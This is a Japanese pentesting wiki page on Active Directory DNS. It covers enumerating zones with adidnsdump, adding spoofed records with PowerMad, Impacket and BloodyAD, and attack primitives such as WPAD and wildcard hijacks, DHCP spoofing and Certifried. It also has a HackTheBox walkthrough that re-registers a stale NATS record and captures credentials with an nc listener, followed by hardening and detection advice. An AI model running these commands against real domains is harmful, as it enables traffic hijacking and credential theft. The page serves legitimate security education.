# AD DNS レコード

{{#include ../../banners/hacktricks-training.md}}

デフォルトでは、Active Directory の**すべてのユーザー**が、Domain または Forest の DNS zone 内にある**すべての DNS レコードを enumerate**できます。これは zone transfer と似ており、AD 環境では DNS zone の子オブジェクトを一覧表示できます。

[**adidnsdump**](https://github.com/dirkjanm/adidnsdump) を使うと、内部ネットワークの recon を目的として、zone 内の**すべての DNS レコードを enumerate**して**エクスポート**できます。<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```

>  adidnsdump v1.4.0（2025年4月）では、JSON/Greppable（`--json`）出力、マルチスレッドDNS解決、LDAPSへのバインド時のTLS 1.2/1.3サポートが追加されています  

詳しくは[https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>

---

## レコードの作成 / 変更（ADIDNS spoofing）

**Authenticated Users**グループには、デフォルトでゾーンのDACLに**Create Child**の権限があるため、任意のドメインアカウント（またはコンピューターアカウント）が追加のレコードを登録できます。これは、トラフィックのハイジャック、NTLM relay coercion、さらにはドメイン全体の侵害に利用できます。

### PowerMad / Invoke-DNSUpdate (PowerShell)

```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```

### Impacket – dnsupdate.py  (Python)

```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```

*(dnsupdate.py は Impacket ≥0.12.0 に同梱されています)*

### BloodyAD

```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```

---

## 一般的な攻撃プリミティブ

1. **ワイルドカードレコード** – `*.<zone>` により、AD DNS サーバーを LLMNR/NBNS spoofing に似た、企業全体に応答するサーバーにできます。NTLM hash の取得や、LDAP/SMB への relay に悪用できます。（WINS lookup が無効になっている必要があります。）<sup>[[1]](#references)</sup>    
2. **WPAD hijack** – `wpad` を追加するか、攻撃者のホストを指す **NS** レコードを追加して Global-Query-Block-List を回避し、アウトバウンド HTTP リクエストを透過的に proxy して認証情報を収集します。Microsoft は wildcard/DNAME による bypass を修正しました（CVE-2018-8320）が、**NS record は現在も機能します**。<sup>[[1]](#references)</sup>    
3. **古いエントリの乗っ取り** – 以前ワークステーションが使用していた IP address を取得すると、関連する DNS entry は引き続き名前解決されます。DNS に一切触れずに、resource-based constrained delegation や Shadow-Credentials attacks を実行できます。    
4. **DHCP → DNS spoofing** – Windows DHCP+DNS の既定の構成では、同じ subnet 上の未認証の攻撃者が、dynamic DNS updates を発生させる偽造 DHCP request を送信して、既存の A record（Domain Controller を含む）を上書きできます（Akamai「DDSpoof」、2023年）。これにより Kerberos/LDAP に対する machine-in-the-middle が可能になり、ドメイン全体の乗っ取りにつながる可能性があります。<sup>[[2]](#references)</sup>    
5. **Certifried (CVE-2022-26923)** – 自分が制御する machine account の `dNSHostName` を変更し、一致する A record を登録してから、その名前の証明書を要求することで DC になりすまします。**Certipy** や **BloodyAD** などのツールで、この一連の手順を完全に自動化できます。  

[serialized target information](../ntlm/README.md#ntlm--kerberos-reflection-via-serialized-spns-cve-2025-33073) を含む AD DNS record は、条件付き relay chain の一部となる可能性があります。これには、呼び出し元が record の作成権限を持つこと、対象コンピューターにその名前への認証を行わせる coercion path があること、そして認証結果を受け入れる relay 先があることが必要です。接続先の protocol は個別に評価してください。受信接続で SMB signing が有効であっても、それだけでは HTTPS WinRM の接続先が relay を受け入れるかどうかは判断できません。Patch level、名前の処理方法、Extended Protection、サービス構成によって結果が変わる場合があります。

---

### 古い動的レコードを介した内部サービスの乗っ取り（NATS の事例）

Dynamic update がすべての認証済みユーザーに許可されている場合、**登録解除されたサービス名を再取得し、攻撃者のインフラを指すように設定できます**。Mirage HTB の DC では、DNS scavenging 後もホスト名 `nats-svc.mirage.htb` が公開されていたため、低権限ユーザーなら誰でも次のことができました。<sup>[[3]](#references)</sup>

1. `dig` で**レコードが存在しないことを確認**し、SOA を調べます:

```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```

2. **自分が制御する外部/VPNインターフェースを指すレコードを再作成する**:

```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```

3. **plaintext serviceをなりすます**。NATSクライアントは認証情報を送信する前に`INFO { ... }`バナーを1つ受け取ることを想定しているため、実際のbrokerから正規のバナーをコピーするだけで秘密情報を収集できます。

```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```

Hijacked された名前を解決するクライアントは、その JSON `CONNECT` フレーム（`"user"`/`"pass"`を含む）を直ちに listener に leak します。攻撃者ホストで公式の `nats-server -V` バイナリを実行する、ログの redaction を無効にする、または単に Wireshark でセッションを sniff するだけで、TLS が任意だったため、同じ平文の認証情報を取得できます。

4. **取得した creds で Pivot** – Mirage では、盗んだ NATS アカウントから JetStream にアクセスでき、再利用可能な AD のユーザー名／パスワードを含む過去の認証イベントが明らかになりました。

このパターンは、セキュリティ保護されていない TCP handshake に依存する AD 統合サービス（HTTP API、RPC、MQTT など）すべてに当てはまります。DNS レコードが hijack されると、攻撃者がサービスそのものになります。
broker 側の列挙と retained-message の手順については、[NATS / JetStream pentesting](../../network-services-pentesting/4222-pentesting-nats.md) を参照してください。

---

## Detection & hardening

* 機密性の高いゾーンでは、**Authenticated Users** から *Create all child objects* 権限を剥奪し、DHCP が使用する専用アカウントに動的更新を委任します。
* 動的更新が必要な場合は、ゾーンを **Secure-only** に設定し、DHCP で **Name Protection** を有効にします。これにより、自身のレコードを上書きできるのは所有者のコンピューターオブジェクトだけになります。
* DNS Server のイベント ID 257/252（動的更新）、770（ゾーン転送）、および `CN=MicrosoftDNS,DC=DomainDnsZones` への LDAP 書き込みを監視します。
* 悪意のある名前（`wpad`、`isatap`、`*`）を、意図的に無害なレコードまたは Global Query Block List でブロックします。
* DNS サーバーにパッチを適用します。たとえば、RCE の脆弱性 CVE-2024-26224 および CVE-2024-26231 は **CVSS 9.8** に達し、Domain Controller に対してリモートから悪用可能です。  



## References

- [1] [ADIDNS 再訪 - WPAD、GQBL など](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, still the de-facto reference for wildcard/WPAD attacks)
- [2] [DHCP DNS 動的更新の悪用による DNS レコードの spoofing](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Dec 2023)
- [3] [HackTheBox Mirage: NFS の leak、Dynamic DNS の悪用、NATS 認証情報の窃取、JetStream の秘密情報、Kerberoasting の連鎖](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [ゾーンに侵入する: adidnsdump を使用した Active Directory DNS の dump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
{{#include ../../banners/hacktricks-training.md}}
